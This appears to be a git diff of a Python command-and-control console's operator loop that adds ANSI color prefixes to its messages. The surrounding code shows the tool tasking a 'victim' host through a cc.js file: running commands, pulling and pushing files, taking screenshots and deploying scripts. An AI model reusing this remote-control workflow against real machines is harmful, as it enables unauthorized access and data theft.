@@ -53,6 +53,29 @@ cc=(pwd + '/WebOnly/cc.js')
 eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py')
 server=(pwd + '/ServerRequirements/server.py')
 
+colorGreen = "\033[1;32;40m"
+colorBlack = "\033[0;37;40m"
+colorRed = "\033[1;31;40m"
+colorYellow = "\033[1;33;40m"
+
+"""
+1 = *
+2 = +
+3 = !
+4 = -
+"""
+green1 = "\033[1;32;40m[*]\033[0;37;40m"
+green2 = "\033[1;32;40m[+]\033[0;37;40m"
+green3 = "\033[1;32;40m[!]\033[0;37;40m"
+green4= "\033[1;32;40m[-]\033[0;37;40m"
+yellow1 = "\033[1;33;40m[*]\033[0;37;40m"
+yellow2 = "\033[1;33;40m[+]\033[0;37;40m"
+yellow3 = "\033[1;33;40m[!]\033[0;37;40m"
+yellow4 = "\033[1;33;40m[-]\033[0;37;40m"
+red1 = "\033[1;31;40m[*]\033[0;37;40m"
+red2 = "\033[1;31;40m[+]\033[0;37;40m"
+red3 = "\033[1;31;40m[!]\033[0;37;40m"
+red4 = "\033[1;31;40m[-]\033[0;37;40m"
 
 #######
 ## Define Functions
@@ -63,28 +86,28 @@ def bannerFunc():
     print(f)
 
 def cleanupFunc():
-    print("[!] Cleaning up..")
+    print(green3 + " Cleaning up..")
     processes = {'eguiHTTPS.py', 'server.py'}
     for proc in psutil.process_iter():
         # check whether the process name matches
         if proc.name() in processes:
             proc.kill()
     time.sleep(2)
-    print("[!] Server successfully shutdown, Goodbye!")
+    print(green3 + " Server successfully shutdown, Goodbye!")
 
 def keyboardFunc():
-    raw_input("[!] Press Enter to continue...")
+    raw_input(green3 + " Press Enter to continue...")
 
 def howToFunc():
     # MAYBE
     print("")
-    print("[*] Type '1' to run a command")
-    print("[*] Type '2' to download a file from victim")
-    print("[*] Type '3' to upload a file to victim")
-    print("[*] Type '4' to take a screenshot")
-    print("[*] Type '5' to run a script")
-    print("[*] Type 'shell' to run a local shell command")
-    print("[*] Type 'q' or 'Q' to shutdown")
+    print(green1 + " Type '1' to run a command")
+    print(green1 +" Type '2' to download a file from victim")
+    print(green1 + " Type '3' to upload a file to victim")
+    print(green1 + " Type '4' to take a screenshot")
+    print(green1 + " Type '5' to run a script")
+    print(green1 + " Type 'shell' to run a local shell command")
+    print(green1 + " Type 'q' or 'Q' to shutdown")
 
 def mainLoopFunc():
     # Main Loop
@@ -92,7 +115,7 @@ def mainLoopFunc():
     #print('MAIN LOOP')
     while True:
         howToFunc()
-        user_input = str(raw_input("[+] Type '1', '2', '3', '4', '5', 'shell', or 'q/Q'\n"))
+        user_input = str(raw_input(yellow1 + " Type '1', '2', '3', '4', '5', 'shell', or 'q/Q'\n"))
         print(user_input)
 
         ###################
@@ -100,7 +123,7 @@ def mainLoopFunc():
         ###################
         if user_input is '1':
             #print("COMMAND!")
-            command_input = raw_input("[+] What command do you want to run?\n")
+            command_input = raw_input(yellow1 + " What command do you want to run?\n")
             #print("Command is " + command_input)
 
             # Write command to cc
@@ -118,21 +141,21 @@ def mainLoopFunc():
         ###################
         elif user_input is '2':
             print("DOWNLOAD FROM VICTIM")
-            command_input = raw_input("[+] What file do you want to Download from Victim?\n")
+            command_input = raw_input(yellow1 + " What file do you want to Download from Victim?\n")
             # Write command to cc
             f = open (cc, 'w')
             f.write(user_input + '\n')
             f.write(command_input + '\n')
             f.close()
 
-            print("[*] Waiting for results..")
+            print(yellow1 + " Waiting for results..")
             time.sleep(SLEEP)
             time.sleep(SLEEP)
             
             # Change name from FILENAME (created in eguiHTTPS.py) to real Filename
             os.rename('./WebOnly/FILENAME', './Files/' + command_input)
             time.sleep(2)
-            print("[!] " + command_input + " has been downloaded and saved to " + pwd + '/Files/' + command_input)
+            print(green3 + " " + command_input + " has been downloaded and saved to " + pwd + '/Files/' + command_input)
  
             continue
 
@@ -141,7 +164,7 @@ def mainLoopFunc():
         #####################
         elif user_input is '3':
             #print("UPLOAD TO VICTIM")
-            command_input = raw_input("[+] What file do you want to Upload to Victim?\n")
+            command_input = raw_input(yellow2 + " What file do you want to Upload to Victim?\n")
             # Write command to cc
             f = open (cc, 'w')
             f.write(user_input + '\n')
@@ -151,9 +174,9 @@ def mainLoopFunc():
             # Copy file you want to upload (located in ./Files/) to ./WebOnly/
             shutil.copy('./Files/' + command_input, './WebOnly/')
 
-            print("[*] Uploading file to Victim...")
+            print(yellow1 + " Uploading file to Victim...")
             time.sleep(SLEEP)
-            print("[*] Let's make sure it's there..")
+            print(yellow1 + " Let's make sure it's there..")
 
             # Validate it's there by running "dir <file>" on victim
             f = open (cc, 'w')
@@ -187,11 +210,11 @@ def mainLoopFunc():
             f.write(user_input + '\n')
             f.close()
 
-            print("[*] Performing Screen Capture...")
+            print(yellow1 + " Performing Screen Capture...")
             time.sleep(3)
-            print("[!] Screen Capture Complete!")
+            print(green3 + " Screen Capture Complete!")
             time.sleep(1)
-            print("[*] Grabbing Screen Capture...")
+            print(yellow1 + " Grabbing Screen Capture...")
             time.sleep(3)
 
             # Make Date File for Screenshot name
@@ -216,7 +239,7 @@ def mainLoopFunc():
         ###########
         elif user_input == 'shell':
             # Get input from user and use os.system to run the command
-            command = raw_input('What local command do you want to run?\n')
+            command = raw_input(yellow2 + ' What local command do you want to run?\n')
             output = os.system(command)
             print(output)
 
@@ -234,21 +257,21 @@ def mainLoopFunc():
 
             #print("Below are the items")
             for list in scripts:
-                print("[+] Choose: " + str(scripts.index(list)+1) + " for " + list)
+                print(yellow2 + " Choose: " + str(scripts.index(list)+1) + " for " + list)
 
             #print("There are a total of " + str(totalScripts))
             
             while True:
                 try:
-                    user_input2 = int(raw_input("[+] Choose the Script # or '0' to quit\n"))
+                    user_input2 = int(raw_input(yellow2 + " Choose the Script # or '0' to quit\n"))
                 except ValueError:
                     print("[-] That's not a number!")
                 else:
                     if 1 <= user_input2 <= int(totalScripts):
 
-                        second_input = str(raw_input("[!] Are you sure?? 'yes' or 'no'\n"))
+                        second_input = str(raw_input(yellow3 + " Are you sure?? 'yes' or 'no'\n"))
                         if second_input == 'no':
-                            print("[*] Good catch, leaving..")
+                            print(red1 + " Good catch, leaving..")
                             break
                         elif second_input == 'yes':
                             #print("Good job!")
@@ -256,7 +279,7 @@ def mainLoopFunc():
                             #The below works
                             new = (int(user_input2) -1)
                             choice = str(scripts[new])
-                            print("[*] You chose script: " + choice)
+                            print(yellow1 + " You chose script: " + choice)
                             #print("Let's move that to ./WebOnly/")
                             shutil.copy('./Scripts/' + choice, './WebOnly/' + choice)
                             #print("File is now in ./WebOnly/")
@@ -268,14 +291,14 @@ def mainLoopFunc():
                             f.close()
                             
                             # SCRIPT IS NOW DEPLOYED.. 30 sec minimum wait
-                            print("[*] Script has been deployed...")
+                            print(yellow1 + " Script has been deployed...")
                             # Just wait a bit
                             time.sleep(5)
-                            print("[*] Script is now running on victim...")
+                            print(yellow1 + " Script is now running on victim...")
                             time.sleep(5)
                             #print("[!] Script is being processed...")
                             time.sleep(10)
-                            print("[*] Output it being uploaded...")
+                            print(yellow1 + " Output it being uploaded...")
                             
                             # Update cc.js with 'download from victim' command..
                             f = open(cc,'w')
@@ -284,7 +307,7 @@ def mainLoopFunc():
                             f.close()
                             
                             time.sleep(10)
-                            print("[*] Waiting for results...")
+                            print(yellow1 + " Waiting for results...")
                             time.sleep(10)
 
 
@@ -293,18 +316,18 @@ def mainLoopFunc():
                             time.sleep(2)
                             
                             # Print completion
-                            print('[*] ' + choice + " has been completed and results have been saved to:\n " + pwd + '/Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt")                        
+                            print(green1 + ' ' + choice + " has been completed and results have been saved to:\n " + pwd + '/Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt")                        
 
                             break
 
                         else:
-                            print("[!] Choose 'yes' or 'no'")
+                            print(yellow3 + " Choose 'yes' or 'no'")
                             continue
                     elif user_input == 0:
-                        print("[-] Okay we leave, goodbye")
+                        print(red4 + " Okay we leave, goodbye")
                         break
                     else:
-                        print("[-] Out of Range, try again!")
+                        print(red4 + " Out of Range, try again!")
                         continue
                 
         ####
@@ -323,7 +346,7 @@ def mainLoopFunc():
         ## START OVER
         ####
         else:
-            print("[-] Invalid command.. let's start over")
+            print(red4 + " Invalid command.. let's start over")
             continue
 
 def main():
